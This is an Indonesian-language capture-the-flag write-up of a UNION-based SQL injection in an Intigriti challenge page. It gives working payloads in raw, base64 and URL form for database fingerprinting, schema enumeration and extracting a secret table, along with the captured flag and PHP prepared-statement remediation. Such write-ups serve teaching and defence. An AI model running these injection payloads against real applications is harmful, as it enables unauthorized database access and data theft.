# Intigriti Challenge 0926 — Critter Gallery
## UNION-based SQL Injection pada parameter `GET pic` → exfiltrasi `secret_vault.note`

- **Target:** `https://challenge-0926.challenges.intigriti.io/challenge.php`
- **Stack terverifikasi:** `x-powered-by: PHP/8.2.33`, `server: istio-envoy`, MySQL **8.0.46** (Community Server - GPL)
- **DBMS/user:** `critter_gallery` / `gallery@10.18.53.240`
- **Eksekusi:** 2026-09-28 18:26 UTC (dalam window challenge: 21/09 10:00 UTC – 28/09 23:59 UTC)
- **Status:** CONFIRMED — flag diekstraksi via UNION SELECT, diverifikasi ulang dengan `curl` murni (bukan harness)

---

## 1. Ringkasan temuan & root cause

- **Temuan:** SQL injection tipe **UNION-based** pada parameter `GET pic` di `challenge.php`.
  Nilai `pic` di-`base64_decode()`, lalu **diinterpolasi langsung** ke string SQL.
- **Bentuk query (rekonstruksi dari oracle ORDER BY):** satu kolom —
  `SELECT description FROM animals WHERE name = '<input>'`
- **Root cause:** nilai user masuk ke **konteks string literal** tanpa prepared statement/binding.
  Aplikasi memakai `base64` sebagai encoding transport, **bukan** sebagai kontrol keamanan —
  base64 tidak menghalangi injeksi (payload SQL arbitrer dapat di-encode utuh).
- **Dampak:** read access penuh ke seluruh schema `critter_gallery` (via `information_schema`),
  termasuk tabel `secret_vault` yang tidak pernah dirender oleh UI → ekstraksi flag.
- **Bukti kontrol negatif:** payload `'` (base64 `Jw==`) membuat respons **HTTP 200 dengan body 0 byte** —
  query gagal di server dan output halaman dibatalkan (`display_errors=Off`, tidak ada stack trace).
  Ini mengonfirmasi input masuk ke parser SQL, bukan sekadar parameter tampilan.

---

## 2. Bukti kuantitatif (byte-accurate, UA konsisten)

| Input (raw) | `pic` (base64) | HTTP | Body (bytes) | `<div class="desc">` |
|---|---|---|---|---|
| *(tanpa parameter)* | — | 200 | 3775 | *(tidak ada detail section)* |
| *(kosong)* | `` | 200 | 4075 | `desc empty` → `No critter goes by that name yet.` |
| `fox` | `Zm94` | 200 | 4089 | `desc` → `The red fox is a clever, highly adaptable hunter.<br>` |
| `!!!!` (invalid/nonexistent) | `ISEhIQ==` | 200 | 4079 | `desc empty` → `No critter goes by that name yet.` (art fallback `🖼️`) |
| `'` | `Jw==` | 200 | **0** | — *(query error, output dibatalkan)* |
| `"` | `Ig==` | 200 | 4081 | `desc empty` → `No critter goes by that name yet.` |
| `' OR '1'='1` | `JyBPUiAnMSc9JzE=` | 200 | 4489 | **8 deskripsi sekaligus** (semua baris `animals`) |
| `' OR 1=1-- -` | `JyBPUiAxPTEtLSAt` | 200 | 4475 | **8 deskripsi sekaligus** |
| `' ORDER BY 1-- -` | `JyBPUkRFUiBCWSAxLS0gLQ==` | 200 | 4096 | `desc empty` (query valid, 0 baris cocok ⇒ 1 kolom) |
| `' ORDER BY 2-- -` | `JyBPUkRFUiBCWSAyLS0gLQ==` | 200 | **0** | — *(invalid → hanya 1 kolom)* |
| `' UNION SELECT version()-- -` | `JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ==` | 200 | 4079 | `8.0.46<br>` |
| `' UNION SELECT GROUP_CONCAT(table_name) ...` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0=` | 200 | 4169 | `animals,secret_vault<br>` |
| `' UNION SELECT GROUP_CONCAT(table_name,':',column_name) ...` | `JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUsJzonLGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ==` | 200 | 4253 | `animals:description,animals:id,animals:name,secret_vault:id,secret_vault:note<br>` |
| `' UNION SELECT note FROM secret_vault-- -` | `JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=` | 200 | 4133 | **`INTIGRITI{...}<br>`** |

> Catatan metodologi: `LEN` diukur dalam **byte** (`len(body.encode('utf-8'))`), konsisten dengan
> `%{size_download}` curl. Body 0 byte = query error yang membatalkan render halaman.
> Dua varian render `desc` terverifikasi langsung dari HTML tersimpan (`evidence/body_*.bin`,
> `evidence/notfound_render.txt`): `class="desc"` untuk baris hasil, dan `class="desc empty"`
> untuk query valid tanpa baris cocok. Baris 0-hasil **bukan** error — ini penting agar
> oracle `ORDER BY` tidak disalahartikan.

---

## 3. Jejak langkah payload → hasil

- **Baseline** `?pic=Zm94` → `desc` berisi 1 baris; `?pic=` kosong → `desc empty` berisi `No critter goes by that name yet.` Parameter benar-benar menggerakkan query.
- **Kontrol `'` (`Jw==`) → body 0 byte.** Penanda kuat injeksi: payload menghancurkan sintaks SQL.
- **Boolean TRUE (`' OR '1'='1`) → 8 deskripsi.** Kondisi `WHERE` dilucuti; klausa `UNION`/`OR` dieksekusi, bukan di-escape.
- **Kolom ditentukan via `ORDER BY`:** `ORDER BY 1` OK (4096 B), `ORDER BY 2` → 0 B ⇒ **query detail bernilai tunggal**.
- **DBMS ditentukan:** `UNION SELECT version()` → `8.0.46`; `database()` → `critter_gallery`; `user()` → `gallery@10.18.53.240`; `@@version_comment` → `MySQL Community Server - GPL`.
- **Enumerasi tabel:** `information_schema.tables WHERE table_schema=database()` → `animals,secret_vault`.
- **Enumerasi kolom:** `information_schema.columns` → `animals(id,name,description)`, `secret_vault(id,note)`.
- **Ekstraksi flag:** `UNION SELECT note FROM secret_vault` → `INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}`.
- **Verifikasi silang:** request `curl` murni (tanpa Python) menghasilkan `desc` identik; header respons mencatat `PHP/8.2.33`, `istio-envoy`.

---

## 4. Flag

```
INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

---

## 5. Payload — tiga bentuk (raw SQL / base64 / URL lengkap)

Semua payload memakai komentar `-- -` (spasi setelah `--` wajib di MySQL).
Di dalam query string, `=`, `+`, `/` pada base64 **wajib** percent-encoded (`%3D`, `%2B`, `%2F`).

### S1 — Boolean TRUE (baseline injeksi)
```
RAW  : ' OR 1=1-- -
B64  : JyBPUiAxPTEtLSAt
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBPUiAxPTEtLSAt
```

### S2 — Fingerprint DBMS
```
RAW  : ' UNION SELECT version()-- -
B64  : JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ==
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgdmVyc2lvbigpLS0gLQ%3D%3D
```

### S3 — Fingerprint schema/user/versi (satu request)
```
RAW  : ' UNION SELECT CONCAT(database(),' | ',user(),' | ',@@version_comment)-- -
B64  : JyBVTklPTiBTRUxFQ1QgQ09OQ0FUKGRhdGFiYXNlKCksJyB8ICcsdXNlcigpLCcgfCAnLEBAdmVyc2lvbl9jb21tZW50KS0tIC0=
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgQ09OQ0FUKGRhdGFiYXNlKCksJyB8ICcsdXNlcigpLCcgfCAnLEBAdmVyc2lvbl9jb21tZW50KS0tIC0%3D
OUT  : critter_gallery | gallery@10.18.53.240 | MySQL Community Server - GPL
```

### S4 — Enumerasi tabel
```
RAW  : ' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()-- -
B64  : JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0=
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyBXSEVSRSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKS0tIC0%3D
OUT  : animals,secret_vault
```

### S5 — Enumerasi kolom
```
RAW  : ' UNION SELECT GROUP_CONCAT(table_name,':',column_name) FROM information_schema.columns WHERE table_schema=database()-- -
B64  : JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUsJzonLGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ==
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1QgR1JPVVBfQ09OQ0FUKHRhYmxlX25hbWUsJzonLGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5jb2x1bW5zIFdIRVJFIHRhYmxlX3NjaGVtYT1kYXRhYmFzZSgpLS0gLQ%3D%3D
OUT  : animals:description,animals:id,animals:name,secret_vault:id,secret_vault:note
```

### S6 — Ekstraksi flag
```
RAW  : ' UNION SELECT note FROM secret_vault-- -
B64  : JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0=
URL  : https://challenge-0926.challenges.intigriti.io/challenge.php?pic=JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0%3D
OUT  : INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
```

---

## 6. Remediation — prepared statement PDO dengan placeholder

```php
<?php
declare(strict_types=1);

// ---------- SEBELUM (rentan, rekonstruksi) ----------
// $name = base64_decode($_GET['pic'] ?? '');
// $sql  = "SELECT description FROM animals WHERE name = '$name'";
// $rows = $pdo->query($sql);            // <-- interpolasi string = SQLi

// ---------- SESUDAH (aman) ----------
$dsn = 'mysql:host=127.0.0.1;dbname=critter_gallery;charset=utf8mb4';
$pdo = new PDO($dsn, $dbUser, $dbPass, [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES   => false,   // prepared statement asli di server MySQL
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
]);

$raw = (string)($_GET['pic'] ?? '');

// strict mode: base64 tidak valid => null, bukan string sampah
$name = base64_decode($raw, true);
if ($name === false || $name === '') {
    $name = null;
}

// Nilai dikirim sebagai parameter terikat: tidak pernah di-parse sebagai SQL,
// sehingga quote/UNION/komentar di dalam nilai menjadi data biasa.
$stmt = $pdo->prepare('SELECT description FROM animals WHERE name = ? LIMIT 1');
$stmt->execute([$name]);
$row = $stmt->fetch();

if ($row === false) {
    // tampilkan fallback (🖼️) tanpa membocorkan detail query
    $desc = null;
} else {
    $desc = $row['description'];
}

// Output tetap harus di-escape untuk konteks HTML (defense in depth):
echo htmlspecialchars($desc ?? '', ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
```

**Catatan pertahanan berlapis (di luar perbaikan inti):**

1. **Hak akses DB minimum.** User aplikasi `gallery` seharusnya hanya punya `SELECT` pada tabel
   yang dibutuhkan (`animals`) — bukan tabel `secret_vault`. Injeksi tidak akan mengekspos vault
   meski query tetap rentan.
2. **Jangan tampilkan error SQL ke user, tapi juga jangan biarkan body kosong.** Aktifkan logging
   server-side (`log_errors=On`, `display_errors=Off`) dan kirim respons 500/404 yang konsisten —
   respons 200 berbody 0 byte adalah oracle yang memudahkan attacker.
3. **Validasi whitelist** (opsional, bukan pengganti prepared statement): jika nilai valid hanyalah
   nama critter, cek `in_array($name, $allowed, true)` sebelum query.
4. `base64` bukan kontrol keamanan — perlakukan hasil decode sebagai input pengguna mentah.

---

## 7. Langkah reproduce (ringkas)

1. `curl -sS 'https://challenge-0926.challenges.intigriti.io/challenge.php?pic=Zm94'` → `desc` berisi 1 baris (baseline normal).
2. Kirim `pic=Jw%3D%3D` (raw SQL `'`) → **HTTP 200, body 0 byte** ⇒ input menyentuh parser SQL.
3. Kirim `pic=JyBPUiAxPTEtLSAt` (raw `' OR 1=1-- -`) → seluruh 8 deskripsi muncul ⇒ injeksi terkonfirmasi.
4. Kirim `ORDER BY 1` / `ORDER BY 2` → 4096 B vs 0 B ⇒ jumlah kolom = **1**.
5. Kirim `' UNION SELECT version()-- -` → `8.0.46`; `CONCAT(database(),' | ',user())` → `critter_gallery | gallery@10.18.53.240`.
6. Enumerasi `information_schema.tables` → `animals, secret_vault`; `information_schema.columns` → `secret_vault(id, note)`.
7. Kirim `pic=JyBVTklPTiBTRUxFQ1Qgbm90ZSBGUk9NIHNlY3JldF92YXVsdC0tIC0%3D` → `desc` = flag `INTIGRITI{...}`.
8. Submit flag di `https://app.intigriti.com/programs/intigriti/challenge0926/detail`.

---

## 8. Artefak bukti

| File | Isi |
|---|---|
| `probe.py` | harness probe (base64 → URL-encode → fetch → parse `art`/`h2`/`desc`, deteksi error SQL) |
| `evidence/canonical_evidence.txt` | tabel bukti kanonik byte-accurate untuk seluruh payload |
| `evidence/notfound_render.txt` | verifikasi render 0-baris (`desc empty`) untuk `!!!!`, `"`, `ORDER BY 1`, `fox` |
| `evidence/body_flag.html` + `hdr_flag.txt` | respons mentah + header untuk payload ekstraksi flag (curl) |
| `evidence/payloads.md` | tabel payload RAW/B64/URL |
| `evidence/probe_batch1.txt`, `probe_orderby.txt`, `probe_union_dbms.txt`, `probe_tables.txt`, `probe_flag.txt`, `probe_s3.txt` | log probe per tahap |
| `evidence/body_root.bin`, `body_chal.bin`, `body_fox.bin` | render baseline (`/`, tanpa param, `fox`) |
